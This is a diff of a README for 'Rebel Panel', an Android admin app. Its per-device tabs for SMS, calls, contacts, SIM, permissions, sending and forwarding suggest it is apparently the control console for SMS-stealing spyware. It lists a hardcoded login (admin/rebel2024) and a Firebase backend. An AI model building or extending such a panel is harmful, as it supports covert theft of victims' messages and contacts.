@@ -1,14 +1,13 @@
-# Rebel Panel APK
+# Rebel Panel — Native Android APK
 
-Android app that wraps the **Rebel Panel** admin dashboard (`panel/sex.php`) for fast mobile access.
+Dedicated **native** admin app for the Rebel Panel dashboard. No WebView — built with Android UI + Firebase Realtime Database SDK.
 
 ## Features
 
-- Panel HTML bundled inside the APK (`assets/rebel_panel/`) for instant offline UI load
-- Firebase real-time dashboard (devices, SMS, calls, contacts) via WebView
-- Short splash screen (~1.2s) then straight to the panel
-- Pull-to-refresh to reload
-- Fallback: loads from GitHub raw URL if local assets fail
+- Native login screen (`admin` / `rebel2024`)
+- Real-time device list (online/offline, battery, SMS count)
+- Per-device tabs: SMS, Calls, Contacts, SIM, Permissions, Send SMS, Forwarding
+- Same Firebase backend as the web panel (`spinplay99` RTDB)
 
 ## Build
 
@@ -16,13 +15,9 @@ Android app that wraps the **Rebel Panel** admin dashboard (`panel/sex.php`) for
 ./gradlew assembleRelease
 ```
 
-APK output: `app/build/outputs/apk/release/app-release.apk`
+APK: `app/build/outputs/apk/release/app-release.apk`
 
-## Login
+## Package
 
-Default panel login: `admin` / `rebel2024` (as configured in the panel HTML).
-
-## Panel source
-
-- Bundled: `app/src/main/assets/rebel_panel/index.html`
-- Server copy: `panel/sex.php`
+- `com.rebel.panel`
+- Version `3.0-native`
